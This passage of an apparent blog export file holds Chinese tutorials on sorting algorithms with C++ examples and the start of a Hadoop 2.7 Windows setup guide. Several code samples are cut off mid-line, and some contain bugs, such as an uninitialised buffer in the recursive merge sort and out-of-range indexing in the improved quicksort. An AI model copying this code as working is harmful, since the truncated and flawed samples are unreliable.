        --high;                 //修改high值, 前移一位
        for ( j=high; j &gt; low; --j) //反向冒泡,找到最小者
            if (r[j] &lt; r[j-1]) &#123;
                tmp = r[j]; r[j]=r[j-1];r[j-1]=tmp;
            &#125;
        ++low;                  //修改low值,后移一位
    &#125;
&#125;
</code></pre>
]]></content>
      <categories>
        <category>算法</category>
        <category>排序</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>归并排序</title>
    <url>/blog/algorithm/sort/mergesort/</url>
    <content><![CDATA[<p><img src="/images/sort/msort.gif"></p>
<h2 id="基本思想："><a href="#基本思想：" class="headerlink" title="基本思想："></a>基本思想：</h2><p>归并（Merge）排序法是将两个（或两个以上）有序表合并成一个新的有序表，即把待排序序列分为若干个子序列，每个子序列是有序的。然后再把有序子序列合并为整体有序序列。</p>
<p>归并排序示例：</p>
<p><img src="/images/sort/msort.jpg"></p>
<h2 id="合并方法："><a href="#合并方法：" class="headerlink" title="合并方法："></a>合并方法：</h2><p>设r[i…n]由两个有序子表r[i…m]和r[m+1…n]组成，两个子表长度分别为n-i+1、n-m。</p>
<ol>
<li><p>j&#x3D;m+1；k&#x3D;i；i&#x3D;i; &#x2F;&#x2F;置两个子表的起始下标及辅助数组的起始下标</p>
</li>
<li><p>若i&gt;m 或j&gt;n，转⑷ &#x2F;&#x2F;其中一个子表已合并完，比较选取结束</p>
</li>
<li><p>选取r[i]和r[j]较小的存入辅助数组rf<br>如果r[i] &lt; r[j]，rf[k]&#x3D;r[i]； i++； k++； 转⑵<br>否则，rf[k]&#x3D;r[j]； j++； k++； 转⑵</p>
</li>
<li><p>将尚未处理完的子表中元素存入rf<br>如果i&lt;&#x3D;m，将r[i…m]存入rf[k…n] &#x2F;&#x2F;前一子表非空<br>如果j&lt;&#x3D;n , 将r[j…n] 存入rf[k…n] &#x2F;&#x2F;后一子表非空</p>
</li>
<li><p>合并结束。</p>
<p>&#x2F;&#x2F;将r[i…m]和r[m +1 …n]归并到辅助数组rf[i…n]<br>void Merge(ElemType *r,ElemType *rf, int i, int m, int n)<br>{<br>int j,k;<br>for(j&#x3D;m+1,k&#x3D;i; i&lt;&#x3D;m &amp;&amp; j &lt;&#x3D;n ; ++k){<br>    if(r[j] &lt; r[i]) rf[k] &#x3D; r[j++];<br>    else rf[k] &#x3D; r[i++];<br>}<br>while(i &lt;&#x3D; m)  rf[k++] &#x3D; r[i++];<br>while(j &lt;&#x3D; n)  rf[k++] &#x3D; r[j++];<br>}</p>
</li>
</ol>
<h2 id="归并的迭代算法"><a href="#归并的迭代算法" class="headerlink" title="归并的迭代算法"></a>归并的迭代算法</h2><p>1 个元素的表总是有序的。所以对n 个元素的待排序列，每个元素可看成1个有序子表。对子表两两合并生成n&#x2F;2个子表，所得子表除最后一个子表长度可能为1外，其余子表长度均为2。再进行两两合并，直到生成n个元素按关键码有序的表。</p>
<pre><code>void print(int a[], int n)&#123;
    for(int j= 0; j
</code></pre>
<h2 id="两路归并的递归算法"><a href="#两路归并的递归算法" class="headerlink" title="两路归并的递归算法"></a>两路归并的递归算法</h2><pre><code>void MSort(ElemType *r, ElemType *rf,int s, int t)
&#123;
    ElemType *rf2;
    if(s==t) r[s] = rf[s];
    else
    &#123;
        int m=(s+t)/2;          /*平分*p 表*/
        MSort(r, rf2, s, m);        /*递归地将p[s…m]归并为有序的p2[s…m]*/
        MSort(r, rf2, m+1, t);      /*递归地将p[m+1…t]归并为有序的p2[m+1…t]*/
        Merge(rf2, rf, s, m+1,t);   /*将p2[s…m]和p2[m+1…t]归并到p1[s…t]*/
    &#125;
&#125;
void MergeSort_recursive(ElemType *r, ElemType *rf, int n)
&#123;   /*对顺序表*p 作归并排序*/
    MSort(r, rf,0, n-1);
&#125;
</code></pre>
]]></content>
      <categories>
        <category>算法</category>
        <category>排序</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>堆排序</title>
    <url>/blog/algorithm/sort/heapsort/</url>
    <content><![CDATA[<p><img src="/images/sort/hsort.gif"></p>
<p>堆排序是一种树形选择排序，是对直接选择排序的有效改进。</p>
<h2 id="基本思想："><a href="#基本思想：" class="headerlink" title="基本思想："></a>基本思想：</h2><p>堆的定义如下：具有n个元素的序列（k1,k2,…,kn),当且仅当满足</p>
<p><img src="/images/sort/heapsort1.jpg"></p>
<p>时称之为堆。由堆的定义可以看出，堆顶元素（即第一个元素）必为最小项（小顶堆）。</p>
<p>若以一维数组存储一个堆，则堆对应一棵完全二叉树，且所有非叶结点的值均不大于(或不小于)其子女的值，根结点（堆顶元素）的值是最小(或最大)的。如：</p>
<p>（a）大顶堆序列：（96, 83,27,38,11,09)</p>
<p>(b) 小顶堆序列：（12，36，24，85，47，30，53，91）</p>
<p><img src="/images/sort/heapsort2.jpg"></p>
<p>初始时把要排序的n个数的序列看作是一棵顺序存储的二叉树（一维数组存储二叉树），调整它们的存储序，使之成为一个堆，将堆顶元素输出，得到n个元素中最小(或最大)的元素，这时堆的根节点的数最小（或者最大）。然后对前面(n-1)个元素重新调整使之成为堆，输出堆顶元素，得到n个元素中次小(或次大)的元素。依此类推，直到只有两个节点的堆，并对它们作交换，最后得到有n个节点的有序序列。称这个过程为堆排序。</p>
<p>因此，实现堆排序需解决两个问题：</p>
<ol>
<li><p>如何将n 个待排序的数建成堆；</p>
</li>
<li><p>输出堆顶元素后，怎样调整剩余n-1 个元素，使其成为一个新堆。</p>
</li>
</ol>
<p>首先讨论第二个问题：输出堆顶元素后，对剩余n-1元素重新建成堆的调整过程。</p>
<p>调整小顶堆的方法：</p>
<ol>
<li>设有m 个元素的堆，输出堆顶元素后，剩下m-1个元素。将堆底元素送入堆顶（（最后一个元素与堆顶进行交换），堆被破坏，其原因仅是根结点不满足堆的性质。</li>
<li>将根结点与左、右子树中较小元素的进行交换。</li>
<li>若与左子树交换：如果左子树堆被破坏，即左子树的根结点不满足堆的性质，则重复方法 （2）.</li>
<li>若与右子树交换，如果右子树堆被破坏，即右子树的根结点不满足堆的性质。则重复方法 （2）.</li>
<li>继续对不满足堆性质的子树进行上述交换操作，直到叶子结点，堆被建成。</li>
</ol>
<p>称这个自根结点到叶子结点的调整过程为筛选。如图：</p>
<p><img src="/images/sort/heapsort3.jpg"></p>
<p>再讨论对n 个元素初始建堆的过程。</p>
<p>建堆方法：对初始序列建堆的过程，就是一个反复进行筛选的过程。</p>
<ol>
<li>n 个结点的完全二叉树，则最后一个结点是第n&#x2F;2个结点的子树。</li>
<li>筛选从第n&#x2F;2个结点为根的子树开始，该子树成为堆。</li>
<li>之后向前依次对各结点为根的子树进行筛选，使之成为堆，直到根结点。</li>
</ol>
<p>如图建堆初始过程：无序序列：（49，38，65，97，76，13，27，49）</p>
<p><img src="/images/sort/heapsort4.jpg"></p>
<h2 id="算法的实现："><a href="#算法的实现：" class="headerlink" title="算法的实现："></a>算法的实现：</h2><p>从算法描述来看，堆排序需要两个过程，一是建立堆，二是堆顶与堆的最后一个元素交换位置。所以堆排序有两个函数组成。一是建堆的渗透函数，二是反复调用渗透函数实现排序的函数。</p>
<pre><code>void print(int a[], int n)&#123;
    for(int j= 0; j= 0; --i)
        HeapAdjust(H,i,length);
&#125;
/**
 * 堆排序算法
 */
void HeapSort(int H[],int length)
&#123;
    //初始堆
    BuildingHeap(H, length);
    //从最后一个元素开始对序列进行调整
    for (int i = length - 1; i &gt; 0; --i)
    &#123;
        //交换堆顶元素H[0]和堆中最后一个元素
        int temp = H[i]; H[i] = H[0]; H[0] = temp;
        //每次交换堆顶元素和堆中最后一个元素之后，都要对堆进行调整
        HeapAdjust(H,0,i);
  &#125;
&#125;

int main()&#123;
    int H[10] = &#123;3,1,5,7,2,4,9,6,10,8&#125;;
    cout&lt;&lt;&quot;初始值：&quot;;
    print(H,10);
    HeapSort(H,10);
    //selectSort(a, 8);
    cout&lt;&lt;&quot;结果：&quot;;
    print(H,10);

&#125;
</code></pre>
<p>分析:</p>
<p>设树深度为k，<code>k=[log~2~n]+1</code>。从根到叶的筛选，元素比较次数至多&#96;2(k-1)次，交换记录至多k次。所以，在建好堆后，排序过程中的筛选次数不超过下式：</p>
<p><img src="/images/sort/heapsort5.jpg"></p>
<p>而建堆时的比较次数不超过<code>4n</code>次，因此堆排序最坏情况下，时间复杂度也为：<code>O(nlogn)</code>。</p>
]]></content>
      <categories>
        <category>算法</category>
        <category>排序</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>快速排序</title>
    <url>/blog/algorithm/sort/quicksort/</url>
    <content><![CDATA[<p><img src="/images/sort/qsort.gif"></p>
<h2 id="基本思想："><a href="#基本思想：" class="headerlink" title="基本思想："></a>基本思想：</h2><ol>
<li>选择一个基准元素,通常选择第一个元素或者最后一个元素,</li>
<li>通过一趟排序讲待排序的记录分割成独立的两部分，其中一部分记录的元素值均比基准元素值小。另一部分记录的元素值比基准值大。</li>
<li>此时基准元素在其排好序后的正确位置</li>
<li>然后分别对这两部分记录用同样的方法继续进行排序，直到整个序列有序。</li>
</ol>
<p>一趟排序的过程：</p>
<p><img src="/images/sort/qsort1.jpg"></p>
<p>排序的全过程</p>
<p><img src="/images/sort/qsort2.jpg"></p>
<h2 id="算法的实现："><a href="#算法的实现：" class="headerlink" title="算法的实现："></a>算法的实现：</h2><p>递归实现：</p>
<pre><code>void print(int a[], int n)&#123;
    for(int j= 0; j&lt; n; j++)&#123;
        cout&lt;&lt; a[j] &lt;&lt;&quot;  &quot;;
    &#125;
    cout&lt;&lt; endl;
&#125;

void swap(int *a, int *b)
&#123;
    int tmp = *a;
    *a = *b;
    *b = tmp;
&#125;

int partition(int a[], int low, int high)
&#123;
    int privotKey = a[low];                             //基准元素
    while(low &lt; high)&#123;                                   //从表的两端交替地向中间扫描
        while(low &lt; high  &amp;&amp; a[high] &gt;= privotKey) --high;  //从high 所指位置向前搜索，至多到low+1 位置。将比基准元素小的交换到低端
        swap(&amp;a[low], &amp;a[high]);
        while(low &lt; high  &amp;&amp; a[low] &lt;= privotKey ) ++low;
        swap(&amp;a[low], &amp;a[high]);
    &#125;
    print(a,10);
    return low;
&#125;


void quickSort(int a[], int low, int high)&#123;
    if(low &lt; high)&#123;
        int privotLoc = partition(a,  low,  high);  //将表一分为二
        quickSort(a,  low,  privotLoc -1);          //递归对低子表递归排序
        quickSort(a,   privotLoc + 1, high);        //递归对高子表递归排序
    &#125;
&#125;

int main()&#123;
    int a[10] = &#123;3,1,5,7,2,4,9,6,10,8&#125;;
    cout&lt;&lt;&quot;初始值：&quot;;
    print(a,10);
    quickSort(a,0,9);
    cout&lt;&lt;&quot;结果：&quot;;
    print(a,10);

&#125;
</code></pre>
<h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><p>快速排序是通常被认为在同数量级（O(nlog2n)）的排序方法中平均性能最好的。但若初始序列按关键码有序或基本有序时，快排序反而蜕化为冒泡排序。为改进之，通常以“三者取中法”来选取基准记录，即将排序区间的两个端点与中点三个记录关键码居中的调整为支点记录。快速排序是一个不稳定的排序方法。</p>
<h2 id="快速排序的改进"><a href="#快速排序的改进" class="headerlink" title="快速排序的改进"></a>快速排序的改进</h2><p>在本改进算法中,只对长度大于k的子序列递归调用快速排序,让原序列基本有序，然后再对整个基本有序序列用插入排序算法排序。实践证明，改进后的算法时间复杂度有所降低，且当k取值为8 左右时,改进算法的性能最佳。算法思想如下：</p>
<pre><code>void print(int a[], int n)&#123;
    for(int j= 0; j &lt; n; j++)&#123;
        cout&lt;&lt; a[j] &lt;&lt; &quot;  &quot;;
    &#125;
    cout &lt;&lt; endl;
&#125;

void swap(int *a, int *b)
&#123;
    int tmp = *a;
    *a = *b;
    *b = tmp;
&#125;

int partition(int a[], int low, int high)
&#123;
    int privotKey = a[low];                 //基准元素
    while(low &lt; high)&#123;                   //从表的两端交替地向中间扫描
        while(low &lt; high  &amp;&amp; a[high] &gt;= privotKey) --high; //从high 所指位置向前搜索，至多到low+1 位置。将比基准元素小的交换到低端
        swap(&amp;a[low], &amp;a[high]);
        while(low &lt; high  &amp;&amp; a[low] &lt;= privotKey ) ++low;
        swap(&amp;a[low], &amp;a[high]);
    &#125;
    print(a,10);
    return low;
&#125;


void qsort_improve(int r[ ],int low,int high, int k)&#123;
    if( high -low &gt; k ) &#123; //长度大于k时递归, k为指定的数
        int pivot = partition(r, low, high); // 调用的Partition算法保持不变
        qsort_improve(r, low, pivot - 1,k);
        qsort_improve(r, pivot + 1, high,k);
    &#125;
&#125;
void quickSort(int r[], int n, int k)&#123;
    qsort_improve(r,0,n,k);//先调用改进算法Qsort使之基本有序

    //再用插入排序对基本有序序列排序
    for(int i=1; i&lt;=n;i ++)&#123;
        int tmp = r[i];
        int j=i-1;
        while(tmp &lt; r[j])&#123;
            r[j+1]=r[j]; j=j-1;
        &#125;
        r[j+1] = tmp;
    &#125;

&#125;

int main()&#123;
    int a[10] = &#123;3,1,5,7,2,4,9,6,10,8&#125;;
    cout&lt;&lt;&quot;初始值：&quot;;
    print(a,10);
    quickSort(a,9,4);
    cout&lt;&lt;&quot;结果：&quot;;
    print(a,10);

&#125;
</code></pre>
]]></content>
      <categories>
        <category>算法</category>
        <category>排序</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>桶排序/基数排序</title>
    <url>/blog/algorithm/sort/radixsort/</url>
    <content><![CDATA[<p>说基数排序之前，我们先说桶排序。</p>
<h2 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h2><p>将阵列分到有限数量的桶子里。每个桶子再个别排序（有可能再使用别的排序算法或是以递回方式继续使用桶排序进行排序）。桶排序是鸽巢排序的一种归纳结果。当要被排序的阵列内的数值是均匀分配的时候，桶排序使用线性时间<code>（Θ（n））</code>。但桶排序并不是比较排序，他不受到 <code>O(n log n)</code> 下限的影响。</p>
<p>简单来说，就是把数据分组，放在一个个的桶中，然后对每个桶里面的在进行排序。</p>
<p>例如要对大小为<code>[1..1000]</code>范围内的n个整数<code>A[1..n]</code>排序。</p>
<p>首先，可以把桶设为大小为10的范围，具体而言，设集合<code>B[1]</code>存储<code>[1..10]</code>的整数，集合<code>B[2]</code>存储<code>(10..20]</code>的整数，……集合<code>B[i]</code>存储<code>((i-1)*10,i*10]</code>的整数，<code>i=1,2,..100</code>。总共有100个桶。</p>
<p>然后，对<code>A[1..n]</code>从头到尾扫描一遍，把每个<code>A[i]</code>放入对应的桶<code>B[j]</code>中。再对这100个桶中每个桶里的数字排序，这时可用冒泡，选择，乃至快排，一般来说任何排序法都可以。</p>
<p>最后，依次输出每个桶里面的数字，且每个桶中的数字从小到大输出，这样就得到所有数字排好序的一个序列了。</p>
<p>假设有n个数字，有m个桶，如果数字是平均分布的，则每个桶里面平均有n&#x2F;m个数字。如果</p>
<p>对每个桶中的数字采用快速排序，那么整个算法的复杂度是</p>
<pre><code>O(n + m*n/m*log(n/m))=O(n+nlogn-nlogm)
</code></pre>
<p>从上式看出，当m接近n的时候，桶排序复杂度接近O(n)</p>
<p>当然，以上复杂度的计算是基于输入的n个数字是平均分布这个假设的。这个假设是很强的，实际应用中效果并没有这么好。如果所有的数字都落在同一个桶中，那就退化成一般的排序了。</p>
<p>前面说的几大排序算法，大部分时间复杂度都是<code>O（n2）</code>，也有部分排序算法时间复杂度是<code>O(nlogn)</code>。而桶式排序却能实现<code>O（n）</code>的时间复杂度。但桶排序的缺点是：</p>
<p>1）首先是空间复杂度比较高，需要的额外开销大。排序有两个数组的空间开销，一个存放待排序数组，一个就是所谓的桶，比如待排序值是从0到m-1，那就需要m个桶，这个桶数组就要至少m个空间。</p>
<p>2）其次待排序的元素都要在一定的范围内等等。</p>
<p>桶式排序是一种分配排序。分配排序的特定是不需要进行关键码的比较，但前提是要知道待排序列的一些具体情况。</p>
<p>分配排序的基本思想：说白了就是进行多次的桶式排序。</p>
<p>基数排序过程无须比较关键字，而是通过“分配”和“收集”过程来实现排序。它们的时间复杂度可达到线性阶：O(n)。</p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>扑克牌中52 张牌，可按花色和面值分成两个字段，其大小关系为：</p>
<p>花色： 梅花&lt; 方块&lt; 红心&lt; 黑心</p>
<p>面值： 2 &lt; 3 &lt; 4 &lt; 5 &lt; 6 &lt; 7 &lt; 8 &lt; 9 &lt; 10 &lt; J&lt; Q &lt; K &lt; A</p>
<p>若对扑克牌按花色、面值进行升序排序，得到如下序列：</p>
<p><img src="/images/sort/rsort.jpg"></p>
<p>即两张牌，若花色不同，不论面值怎样，花色低的那张牌小于花色高的，只有在同花色情况下，大小关系才由面值的大小确定。这就是多关键码排序。</p>
<p>为得到排序结果，我们讨论两种排序方法。</p>
<p>方法1：先对花色排序，将其分为4个组，即梅花组、方块组、红心组、黑心组。再对每个组分别按面值进行排序，最后，将4个组连接起来即可。</p>
<p>方法2：先按13 个面值给出13 个编号组(2 号，3 号，…，A号)，将牌按面值依次放入对应的编号组，分成13 堆。再按花色给出4个编号组(梅花、方块、红心、黑心)，将2号组中牌取出分别放入对应花色组，再将3号组中牌取出分别放入对应花色组，……，这样，4个花色组中均按面值有序，然后，将4个花色组依次连接起来即可。</p>
<p>设n 个元素的待排序列包含d个关键码<code>&#123;k1，k2，…，kd&#125;</code>，则称序列对关键码<code>&#123;k1，k2，…，kd&#125;</code>有序是指：对于序列中任两个记录<code>r[i]</code>和<code>r[j](1≤i≤j≤n)</code>都满足下列有序关系：</p>
<p><img src="/images/sort/rsort2.jpg"></p>
<p>其中k1 称为最主位关键码，kd 称为最次位关键码。</p>
<h2 id="两种多关键码排序方法："><a href="#两种多关键码排序方法：" class="headerlink" title="两种多关键码排序方法："></a>两种多关键码排序方法：</h2><p>多关键码排序按照从最主位关键码到最次位关键码或从最次位到最主位关键码的顺序逐次排序，分两种方法：</p>
<p>最高位优先(Most Significant Digit first)法，简称MSD 法：</p>
<p>1）先按k1 排序分组，将序列分成若干子序列，同一组序列的记录中，关键码k1相等。</p>
<p>2）再对各组按k2排序分成子组，之后，对后面的关键码继续这样的排序分组，直到按最次位关键码kd<br>对各子组排序后。</p>
<p>3）再将各组连接起来，便得到一个有序序列。扑克牌按花色、面值排序中介绍的方法一即是MSD<br>法。</p>
<p>最低位优先(Least Significant Digit first)法，简称LSD 法：</p>
<p>1) 先从kd开始排序，再对kd-1进行排序，依次重复，直到按k1排序分组分成最小的子序列后。</p>
<p>2) 最后将各个子序列连接起来，便可得到一个有序的序列,扑克牌按花色、面值排序中介绍的方法二即是LSD 法。</p>
<h2 id="基于LSD方法的链式基数排序的基本思想"><a href="#基于LSD方法的链式基数排序的基本思想" class="headerlink" title="基于LSD方法的链式基数排序的基本思想"></a>基于LSD方法的链式基数排序的基本思想</h2><p>“多关键字排序”的思想实现“单关键字排序”。对数字型或字符型的单关键字，可以看作由多个数位或多个字符构成的多关键字，此时可以采用“分配-收集”的方法进行排序，这一过程称作基数排序法，其中每个数字或字符可能的取值个数称为基数。比如，扑克牌的花色基数为4，面值基数为13。在整理扑克牌时，既可以先按花色整理，也可以先按面值整理。按花色整理时，先按红、黑、方、花的顺序分成4摞（分配），再按此顺序再叠放在一起（收集），然后按面值的顺序分成13摞（分配），再按此顺序叠放在一起（收集），如此进行二次分配和收集即可将扑克牌排列有序。</p>
<h2 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序:"></a>基数排序:</h2><p>是按照低位先排序，然后收集；再按照高位排序，然后再收集；依次类推，直到最高位。有时候有些属性是有优先级顺序的，先按低优先级排序，再按高优先级排序。最后的次序就是高优先级高的在前，高优先级相同的低优先级高的在前。基数排序基于分别排序，分别收集，所以是稳定的。</p>
<h2 id="算法实现："><a href="#算法实现：" class="headerlink" title="算法实现："></a>算法实现：</h2><pre><code>Void RadixSort(Node L[],length,maxradix)  
&#123;  
   int m,n,k,lsp;  
   k=1;m=1;  
   int temp[10][length-1];  
   Empty(temp); //清空临时空间  
   while(k
</code></pre>
]]></content>
      <categories>
        <category>算法</category>
        <category>排序</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>希尔排序</title>
    <url>/blog/algorithm/sort/shellsort/</url>
    <content><![CDATA[<p><img src="/images/sort/shsort.gif"></p>
<p>希尔排序是1959 年由D.L.Shell提出来的，相对直接排序有较大的改进。希尔排序又叫缩小增量排序</p>
<h2 id="基本思想："><a href="#基本思想：" class="headerlink" title="基本思想："></a>基本思想：</h2><p>先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序，待整个序列中的记录“基本有序”时，再对全体记录进行依次直接插入排序。</p>
<p>操作方法：</p>
<ol>
<li>选择一个增量序列t1，t2，…，tk，其中ti&gt;tj，tk&#x3D;1；</li>
<li>按增量序列个数k，对序列进行k 趟排序；</li>
<li>每趟排序，根据对应的增量ti，将待排序列分割成若干长度为m的子序列，分别对各子表进行直接插入排序。仅增量因子为1时，整个序列作为一个表来处理，表长度即为整个序列的长度。</li>
</ol>
<p>希尔排序的示例：</p>
<p><img src="/images/sort/shellsort.jpg">\</p>
<h2 id="算法实现："><a href="#算法实现：" class="headerlink" title="算法实现："></a>算法实现：</h2><p>我们简单处理增量序列：增量序列d &#x3D; {n&#x2F;2 ,n&#x2F;4, n&#x2F;8 …..1}</p>
<p>n为要排序数的个数</p>
<p>即：先将要排序的一组记录按某个增量d（n&#x2F;2,n为要排序数的个数）分成若干组子序列，每组中记录的下标相差d.对每组中全部元素进行直接插入排序，然后再用一个较小的增量（d&#x2F;2）对它进行分组，在每组中再进行直接插入排序。继续不断缩小增量直至为1，最后使用直接插入排序完成排序。</p>
<pre><code>oid print(int a[], int n ,int i)&#123;
    cout&lt;= 1  )&#123;
        ShellInsertSort(a, n, dk);
        dk = dk/2;
    &#125;
&#125;
int main()&#123;
    int a[8] = &#123;3,1,5,7,2,4,9,6&#125;;
    //ShellInsertSort(a,8,1); //直接插入排序
    shellSort(a,8);           //希尔插入排序
    print(a,8,8);
&#125;
</code></pre>
<p>希尔排序时效分析很难，关键码的比较次数与记录移动次数依赖于增量因子序列d的选取，特定情况下可以准确估算出关键码的比较次数和记录的移动次数。目前还没有人给出选取最好的增量因子序列的方法。增量因子序列可以有各种取法，有取奇数的，也有取质数的，但需要注意：增量因子中除1外没有公因子，且最后一个增量因子必须为1。希尔排序方法是一个不稳定的排序方法。</p>
]]></content>
      <categories>
        <category>算法</category>
        <category>排序</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>简单选择排序</title>
    <url>/blog/algorithm/sort/sselectsort/</url>
    <content><![CDATA[<p><img src="/images/sort/ssort.gif"></p>
<h2 id="基本思想："><a href="#基本思想：" class="headerlink" title="基本思想："></a>基本思想：</h2><p>在要排序的一组数中，选出最小（或者最大）的一个数与第1个位置的数交换；然后在剩下的数当中再找最小（或者最大）的与第2个位置的数交换，依次类推，直到第n-1个元素（倒数第二个数）和第n个元素（最后一个数）比较为止。</p>
<p>简单选择排序的示例：</p>
<p><img src="/images/sort/sselectsort.jpg">\</p>
<h2 id="操作方法："><a href="#操作方法：" class="headerlink" title="操作方法："></a>操作方法：</h2><p>第一趟，从n 个记录中找出关键码最小的记录与第一个记录交换；</p>
<p>第二趟，从第二个记录开始的n-1个记录中再选出关键码最小的记录与第二个记录交换；</p>
<p>以此类推…..</p>
<p>第i 趟，则从第i 个记录开始的n-i+1 个记录中选出关键码最小的记录与第i个记录交换，</p>
<p>直到整个序列按关键码有序。</p>
<h2 id="算法实现："><a href="#算法实现：" class="headerlink" title="算法实现："></a>算法实现：</h2><pre><code>void print(int a[], int n ,int i)&#123;
    cout&lt;&lt;&quot;第&quot;&lt; a[j]) k = j;
    &#125;
    return k;
&#125;

/**
 * 选择排序
 *
 */
void selectSort(int a[], int n)&#123;
    int key, tmp;
    for(int i = 0; i&lt; n; ++i) &#123;
        key = SelectMinKey(a, n,i);           //选择最小的元素
        if(key != i)&#123;
            tmp = a[i];  a[i] = a[key]; a[key] = tmp; //最小元素与第i位置元素互换
        &#125;
        print(a,  n , i);
    &#125;
&#125;
int main()&#123;
    int a[8] = &#123;3,1,5,7,2,4,9,6&#125;;
    cout&lt;&lt;&quot;初始值：&quot;;
    for(int j= 0; j&lt;8; j++)&#123;
        cout&lt;
</code></pre>
<h2 id="简单选择排序的改进——二元选择排序"><a href="#简单选择排序的改进——二元选择排序" class="headerlink" title="简单选择排序的改进——二元选择排序"></a>简单选择排序的改进——二元选择排序</h2><p>简单选择排序，每趟循环只能确定一个元素排序后的定位。我们可以考虑改进为每趟循环确定两个元素（当前趟最大和最小记录）的位置,从而减少排序所需的循环次数。改进后对n个数据进行排序，最多只需进行[n&#x2F;2]趟循环即可。具体实现如下：</p>
<pre><code>void SelectSort(int r[],int n) &#123;
    int i ,j , min ,max, tmp;
    for (i=1 ;i &lt;= n/2;i++) &#123;
        // 做不超过n/2趟选择排序
        min = i; max = i ; //分别记录最大和最小关键字记录位置
        for (j= i+1; j&lt;= n-i; j++) &#123;
            if (r[j] &gt; r[max]) &#123;
                max = j ; continue ;
            &#125;
            if (r[j]&lt; r[min]) &#123;
                min = j ;
            &#125;
      &#125;
      //该交换操作还可分情况讨论以提高效率
      tmp = r[i-1]; r[i-1] = r[min]; r[min] = tmp;
      tmp = r[n-i]; r[n-i] = r[max]; r[max] = tmp;

    &#125;
&#125;
</code></pre>
]]></content>
      <categories>
        <category>算法</category>
        <category>排序</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>直接插入排序</title>
    <url>/blog/algorithm/sort/sisort/</url>
    <content><![CDATA[<p><img src="/images/sort/sisort.gif"></p>
<h2 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想:"></a>基本思想:</h2><p>将一个记录插入到已排序好的有序表中，从而得到一个新，记录数增1的有序表。即：先将序列的第1个记录看成是一个有序的子序列，然后从第2个记录逐个进行插入，直至整个序列有序为止。</p>
<p>要点：设立哨兵，作为临时存储和判断数组边界之用。</p>
<p>直接插入排序示例：</p>
<p><img src="/images/sort/sisort.jpg"></p>
<p>如果碰见一个和插入元素相等的，那么插入元素把想插入的元素放在相等元素的后面。所以，相等元素的前后顺序没有改变，从原无序序列出去的顺序就是排好序后的顺序，所以插入排序是稳定的。</p>
<pre><code>void print(int a[], int n ,int i)&#123;
    cout&lt;
</code></pre>
<h2 id="效率："><a href="#效率：" class="headerlink" title="效率："></a>效率：</h2><p>时间复杂度：O（n^2）.</p>
<p>其他的插入排序有二分插入排序，2-路插入排序。</p>
]]></content>
      <categories>
        <category>算法</category>
        <category>排序</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>选择排序算法准则</title>
    <url>/blog/algorithm/sort/whichsort/</url>
    <content><![CDATA[<p>每种排序算法都各有优缺点。因此，在实用时需根据不同情况适当选用，甚至可以将多种方法结合起来使用。</p>
<p>选择排序算法的依据</p>
<p>影响排序的因素有很多，平均时间复杂度低的算法并不一定就是最优的。相反，有时平均时间复杂度高的算法可能更适合某些特殊情况。同时，选择算法时还得考虑它的可读性，以利于软件的维护。一般而言，需要考虑的因素有以下四点：</p>
<p>1．待排序的记录数目n的大小；</p>
<p>2．记录本身数据量的大小，也就是记录中除关键字外的其他信息量的大小；</p>
<p>3．关键字的结构及其分布情况；</p>
<p>4．对排序稳定性的要求。</p>
<p>设待排序元素的个数为n.</p>
<p>1）当n较大，则应采用时间复杂度为O(nlog2n)的排序方法：快速排序、堆排序或归并排序序。</p>
<p>快速排序：是目前基于比较的内部排序中被认为是最好的方法，当待排序的关键字是随机分布时，快速排序的平均时间最短；</p>
<p>堆排序 ： 如果内存空间允许且要求稳定性的.</p>
<p>归并排序：它有一定数量的数据移动，所以我们可能过与插入排序组合，先获得一定长度的序列，然后再合并，在效率上将有所提高。</p>
<p>2）当n较大，内存空间允许，且要求稳定性 &#x3D;》归并排序</p>
<p>3）当n较小，可采用直接插入或直接选择排序。</p>
<p>直接插入排序：当元素分布有序，直接插入排序将大大减少比较次数和移动记录的次数。</p>
<p>直接选择排序 ：元素分布有序，如果不要求稳定性，选择直接选择排序</p>
<p>5）一般不使用或不直接使用传统的冒泡排序。</p>
<p>6）基数排序</p>
<p>它是一种稳定的排序算法，但有一定的局限性：</p>
<p>1、关键字可分解。</p>
<p>2、记录的关键字位数较少，如果密集更好</p>
<p>3、如果是数字时，最好是无符号的，否则将增加相应的映射复杂度，可先将其正负分开排序。</p>
]]></content>
      <categories>
        <category>算法</category>
        <category>排序</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>hadoop2.7-windows环境搭建</title>
    <url>/blog/bigdata/hadoop/h27win/</url>
    <content><![CDATA[<h3 id="Hadoop-2-7-3"><a href="#Hadoop-2-7-3" class="headerlink" title="Hadoop:2.7.3"></a>Hadoop:2.7.3</h3><p>下载hadoop:<a href="http://hadoop.apache.org/releases.html#Download">http://hadoop.apache.org/releases.html#Download</a></p>
<p>解压hadoop到一个文件夹:</p>
<p><code>D:\hadoop\hadoop-2.7.3</code></p>
<p>配置环境变量和java类似</p>
<p>新建HADOOP_HOME变量,地址为</p>
<p><code>D:\hadoop\hadoop-2.7.3</code></p>
<p>新建HADOOP_CONF_DIR变量,地址为:</p>
<p><code>%HADOOP_HOME%\etc\hadoop</code></p>
<p>新建YARN_CONF_DIR 变量,地址为:</p>
<p><code>%HADOOP_CONF_DIR%</code></p>
